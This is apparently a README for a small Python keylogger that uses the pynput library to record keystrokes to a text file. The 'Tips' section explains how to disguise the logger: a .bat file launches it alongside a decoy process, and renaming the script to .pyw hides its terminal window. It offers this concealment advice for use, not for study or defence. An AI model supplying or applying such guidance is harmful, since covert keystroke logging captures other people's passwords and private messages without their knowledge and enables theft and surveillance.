## How it works 🧐
Simple keylogger, uses the pynput library. The program captures pressed keys and records them in a .txt file.
The program can be disguised using a .bat file.

## How to use 🔭
Install the pynput library and run the .py file, after that the program captures your keystrokes and records it in the logs file.
```python
pip3 install pynput
````
To stop just close the terminal.

## Tips 👀
You can disguise the program in a .bat, running the program together with another process, while the terminal is open the Keylogger will work.
```
@echo off
start (process)
python main.py
```
You can also open the program hiding the terminal, just remone the filename from "main.py" to "main.pyw", to stop open the taskmaneger and kill the python process.
```
@echo off
start (process)
python main.pyw
```
